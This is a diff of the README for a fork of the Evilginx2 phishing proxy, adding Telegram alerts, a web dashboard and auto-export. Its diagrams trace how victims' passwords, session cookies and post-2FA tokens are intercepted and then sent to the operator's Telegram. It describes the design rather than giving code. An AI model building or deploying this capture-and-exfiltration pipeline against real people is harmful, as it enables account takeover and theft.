+                  ┌──────────────────────────────────┼──────────────────────────────────┐
+                  ▼                                  ▼                                  ▼
+    ┌──────────────────────────┐  ┌──────────────────────────┐  ┌──────────────────────────┐
+    │   TELEGRAM QUEUE          │  │      DASHBOARD           │  │      BUNTDB DB            │
+    │   (Async Notifications)   │  │      (Web UI)            │  │      (Storage)            │
+    │                           │  │                          │  │                          │
+    │   core/telegram_queue.go  │  │   core/dashboard.go      │  │   database/database.go   │
+    │   core/notify.go          │  │                          │  │   database/db_session.go │
+    │   core/tele.go            │  │   HTML template +        │  │                          │
+    │                           │  │   REST API endpoints     │  │   Zero-config embedded   │
+    │   Non-blocking buffered   │  │                          │  │   key-value database.    │
+    │   channel (100 jobs).     │  │   Basic auth protected.  │  │                          │
+    └──────────────────────────┘  └──────────────────────────┘  └──────────────────────────┘
+
+
 Complete Data Flow — From Capture to Delivery
 
-PHASE 1: VICTIM INTERACTS
-  Victim opens phishing URL → Browser loads proxied page → Enters credentials → Submits
 
-PHASE 2: PROXY CAPTURES
-  http_proxy.go intercepts the POST request
-  ├── Extracts username/password from form body or JSON
-  ├── Stores in Session object
-  └── Forwards request to REAL website (login succeeds)
+┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                  THE COMPLETE JOURNEY OF A CAPTURED SESSION                                                                  │
+├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                                                                             │
+│  PHASE 1: VICTIM INTERACTS                                                                                                                  │
+│  ┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐  │
+│  │  Victim receives email → Opens phishing URL → Browser loads page (looks identical to real site) → Victim types credentials → Submit │  │
+│  └───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘  │
+│                                          │                                                                                                    │
+│  PHASE 2: PROXY CAPTURES                                                                                                                     │
+│  ┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐  │
+│  │  http_proxy.go intercepts the POST request                                                                                            │  │
+│  │  │                                                                                                                                     │  │
+│  │  ├── Extracts username/password from form body or JSON payload                                                                        │  │
+│  │  ├── Stores in Session object (core/session.go)                                                                                       │  │
+│  │  └── Forwards request to REAL website (login succeeds — victim sees no error)                                                        │  │
+│  └───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘  │
+│                                          │                                                                                                    │
+│  PHASE 3: RESPONSE INTERCEPTION                                                                                                             │
+│  ┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐  │
+│  │  http_proxy.go intercepts the response from real website                                                                               │  │
+│  │  │                                                                                                                                     │  │
+│  │  ├── Captures Set-Cookie headers → stored as CookieTokens                                                                             │  │
+│  │  ├── Captures response body tokens → stored as BodyTokens                                                                             │  │
+│  │  ├── Captures HTTP header tokens → stored as HttpTokens                                                                               │  │
+│  │  └── Checks if all required auth tokens are captured (based on phishlet YAML config)                                                   │  │
+│  └───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘  │
+│                                          │                                                                                                    │
+│  PHASE 4: SESSION PERSISTENCE                                                                                                               │
+│  ┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐  │
+│  │  If session is complete (all required tokens captured):                                                                               │  │
+│  │  │                                                                                                                                     │  │
+│  │  ├── Save to BuntDB via database.db_session.go (CreateSession function)                                                               │  │
+│  │  ├── Auto-export to JSON and CSV files on disk                                                                                        │  │
+│  │  └── Enqueue Telegram notification job (non-blocking)                                                                                 │  │
+│  └───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘  │
+│                                          │                                                                                                    │
+│  PHASE 5: TELEGRAM NOTIFICATION                                                                                                             │
+│  ┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐  │
+│  │  telegram_queue.go receives job → processes asynchronously (doesn't block proxy)                                                       │  │
+│  │  │                                                                                                                                     │  │
+│  │  ├── notify.go → createTxtFile(): formats all tokens into JSON → writes .txt to /tmp                                                  │  │
+│  │  ├── notify.go → formatSessionMessage(): builds MarkdownV2 message (with escaped special chars)                                      │  │
+│  │  ├── tele.go → sendTelegramNotification(): sends document with caption to your Telegram                                              │  │
+│  │  └── notify.go → stores message_id in sessionMessageMap (for future updates)                                                          │  │
+│  └───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘  │
+│                                          │                                                                                                    │
+│  PHASE 6: SUBSEQUENT TOKENS (if any)                                                                                                        │
+│  ┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐  │
+│  │  If more tokens arrive for the same session (e.g., victim completes 2FA after password):                                              │  │
+│  │  │                                                                                                                                     │  │
+│  │  ├── notify.go checks processedSessions map → "already processed?"                                                                    │  │
+│  │  ├── YES → look up message_id from sessionMessageMap                                                                                  │  │
+│  │  ├── tele.go → editMessageFile(): edits the SAME Telegram message (no new message in chat)                                           │  │
+│  │  └── Result: ONE message per session, always updated with latest data. NO SPAM.                                                      │  │
+│  └───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘  │
+│                                          │                                                                                                    │
+│  PHASE 7: DASHBOARD ACCESS                                                                                                                  │
+│  ┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐  │
+│  │  User opens browser → http://SERVER:5000                                                                                              │  │
+│  │  │                                                                                                                                     │  │
+│  │  ├── dashboard.go → handleDashboard(): serves HTML template with inline JavaScript                                                    │  │
+│  │  ├── dashboard.go → handleAPISessions(): returns JSON from BuntDB with search, filter, pagination                                     │  │
+│  │  ├── Frontend JavaScript renders table, handles search/filter/pagination client-side                                                  │  │
+│  │  └── Export buttons download CSV/JSON via /api/sessions/export                                                                        │  │
+│  └───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘  │
+│                                                                                                                                             │
+└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
 
-PHASE 3: RESPONSE INTERCEPTION
-  http_proxy.go intercepts the response from real website
-  ├── Captures Set-Cookie headers → CookieTokens
-  ├── Captures response body tokens → BodyTokens
-  ├── Captures HTTP header tokens → HttpTokens
-  └── Checks if all required auth tokens are captured
 
-PHASE 4: SESSION PERSISTENCE
-  If session is complete:
-  ├── Save to BuntDB via database.db_session.go (CreateSession)
-  └── Notify the Telegram queue
+📂 Repository File Structure
 
-PHASE 5: TELEGRAM NOTIFICATION
-  telegram_queue.go receives job → processes async
-  ├── notify.go → createTxtFile(): formats tokens into JSON → writes .txt
-  ├── notify.go → formatSessionMessage(): builds MarkdownV2 message
-  ├── tele.go → sendTelegramNotification(): sends document with caption
-  └── notify.go → stores message_id in sessionMessageMap
-
-PHASE 6: SUBSEQUENT TOKENS (if any)
-  If more tokens arrive for same session:
-  ├── notify.go checks processedSessions map → already processed?
-  ├── YES → look up message_id from sessionMessageMap
-  └── tele.go → editMessageFile(): edits the same Telegram message
-
-PHASE 7: DASHBOARD ACCESS
-  User opens browser → http://SERVER:5000
-  ├── dashboard.go → serves HTML template with inline JS
-  ├── dashboard.go → returns JSON from BuntDB via REST API
-  └── Frontend JS renders table, search, filter, pagination
-
-📂 Complete File Reference
-
-evilginx2/
+├── main.go                              # 🚀 Entry point — parses flags, initializes all components
 │
-├── main.go                          # Entry point — flags, init, start all components
+├── core/                                # 🧠 Core engine — the brain of the operation
+│   ├── http_proxy.go                    #    MITM reverse proxy (modified for TG integration)
+│   ├── session.go                       #    In-memory session management
+│   ├── config.go                        #    Config (includes Chatid/Teletoken setters)
+│   ├── notify.go                        #    📱 Telegram notification logic + file creation
+│   ├── telegram_queue.go                #    ⏳ Async notification queue (buffered channel)
+│   ├── tele.go                          #    📡 Low-level Telegram API calls
+│   ├── telegram_escape.go               #    🔤 MarkdownV2 escaping for Telegram
+│   ├── tsession.go                      #    📋 Telegram session struct + DB reader
+│   ├── dashboard.go                     #    📊 Web dashboard (HTML + REST API)
+│   ├── auto_export.go                   #    📁 Auto-export sessions to JSON/CSV
+│   ├── nameserver.go                    #    🌐 DNS server
+│   ├── certdb.go                        #    🔐 SSL certificate management
+│   ├── blacklist.go                     #    🚫 IP blacklist
+│   ├── whitelist.go                     #    ✅ IP whitelist
+│   ├── phishlet.go                      #    🎣 Phishlet engine
+│   ├── terminal.go                      #    💻 CLI interface
+│   ├── gophish.go                       #    🔗 Gophish integration
+│   ├── banner.go                        #    🖼️ ASCII art banner
+│   ├── help.go                          #    ❓ Help commands
+│   ├── scripts.go                       #    📜 JS injection scripts
+│   ├── shared.go                        #    🔧 Shared utilities
+│   ├── table.go                         #    📋 Table formatting
+│   └── utils.go                         #    🔧 Utility functions
 │
-├── core/                            # Core engine
-│   ├── http_proxy.go                #    MITM reverse proxy (modified for TG)
-│   ├── session.go                   #    In-memory session management
-│   ├── config.go                    #    Config (includes Chatid/Teletoken)
-│   ├── notify.go                    #    Telegram notification logic + file creation
-│   ├── telegram_queue.go            #    Async notification queue (buffered channel)
-│   ├── tele.go                      #    Low-level Telegram API calls
-│   ├── telegram_escape.go           #    MarkdownV2 escaping for Telegram
-│   ├── tsession.go                  #    Telegram session struct + DB reader
-│   ├── dashboard.go                 #    Web dashboard (HTML + REST API)
-│   ├── auto_export.go               #    Auto-export sessions to JSON/CSV
-│   ├── nameserver.go                #    DNS server
-│   ├── certdb.go                    #    SSL certificate management
-│   ├── blacklist.go                 #    IP blacklist
-│   ├── whitelist.go                 #    IP whitelist
-│   ├── phishlet.go                  #    Phishlet engine
-│   ├── terminal.go                  #    CLI interface
-│   ├── gophish.go                   #    Gophish integration
-│   ├── banner.go                    #    ASCII art banner
-│   ├── help.go                      #    Help commands
-│   ├── scripts.go                   #    JS injection scripts
-│   ├── shared.go                    #    Shared utilities
-│   ├── table.go                     #    Table formatting
-│   └── utils.go                     #    Utility functions
+├── database/                            # 💾 Persistence layer
+│   ├── database.go                      #    BuntDB wrapper — init, helpers, CRUD dispatch
+│   └── db_session.go                    #    Session struct + full CRUD operations
 │
-├── database/                        # Persistence layer
-│   ├── database.go                  #    BuntDB wrapper
-│   └── db_session.go                #    Session struct + full CRUD
+├── phishlets/                           # 🎣 YAML phishing templates (office365, google, linkedin, etc.)
+├── redirectors/                         # 🔀 HTML redirector pages
 │
-├── phishlets/                       # YAML phishing templates
-├── redirectors/                     # HTML redirector pages
+├── Dockerfile                           # 🐳 Multi-stage Alpine build (~18MB)
+├── .dockerignore                        #    Docker build exclusions
+├── docker-compose.yml                   #    Docker Compose configuration
 │
-├── Dockerfile                       # Multi-stage Alpine build (~18MB)
-├── .dockerignore                    # Docker build exclusions
-├── docker-compose.yml               # Docker Compose configuration
+├── Makefile                             # 🔨 Build helpers
+├── go.mod / go.sum                      # 📦 Go module dependencies
 │
-├── Makefile                         # Build helpers
-├── go.mod / go.sum                  # Go module dependencies
-│
-├── DEPLOYMENT.md                    # Full deployment guide
-├── CHANGELOG                        # Version history
-├── LICENSE                          # BSD 3-Clause
-└── README.md                        # This file
+├── DEPLOYMENT.md                        # 📘 Full deployment guide (12 phases, step-by-step)
+├── CHANGELOG                            # 📋 Version history
+├── LICENSE                              # ⚖️ BSD 3-Clause
+└── README.md                            # 📖 This file
 
 ⚖️ Disclaimer
 I am fully aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks.
@@ -893,16 +1185,16 @@ Evilginx should be used only in legitimate penetration testing assignments with 
 
 Unauthorized use of this tool is illegal and unethical. The author and contributors assume no liability for misuse.
 
-👏 Credits & Support
 
+👏 Credits & Support
 Contributors
 
 Contribution	Author	Contact
-Telegram Integration — Async queue, file attachments, auto-updating messages	@officialmonsterz	Telegram / Email
-Web Dashboard — HTML UI, REST API, CSV/JSON export, search, dark mode	@officialmonsterz	Telegram / Email
-Database Layer — BuntDB integration, session CRUD	@officialmonsterz	Telegram / Email
-Docker Build — Multi-stage, Alpine, ~18MB	@officialmonsterz	Telegram / Email
-Auto-Export System — Auto-save sessions to JSON/CSV	@officialmonsterz	Telegram / Email
+Telegram Integration — Async queue, file attachments, auto-updating messages	@officialmonsterz	GitHub / Telegram / shapads@tutamail.com
+Web Dashboard — HTML UI, REST API, CSV/JSON export, search, dark mode	@officialmonsterz	Same as above
+Database Layer — BuntDB integration, session CRUD	@officialmonsterz	Same as above
+Docker Build — Multi-stage, Alpine, ~18MB	@officialmonsterz	Same as above
+Auto-Export System — Auto-save sessions to JSON/CSV	@officialmonsterz	Same as above
 Original Evilginx2/3 (Core Framework)	Kuba Gretzky (@mrgretzky)	kgretzky/evilginx2
 
 Big thanks to Kuba Gretzky for creating such a phenomenal tool and making it open source. This fork builds upon his incredible work.
@@ -912,4 +1204,6 @@ Telegram Support: t.me/officialmonsterz
 Email: shapads@tutamail.com
 GitHub Issues: github.com/officialmonsterz/evilginx2/issues
 Repository: github.com/officialmonsterz/evilginx2
-Created with ❤️ by @officialmonsterz
+Created with ❤ by @officialmonsterz
+
+Special thanks to the entire Evilginx community for their contributions and support.
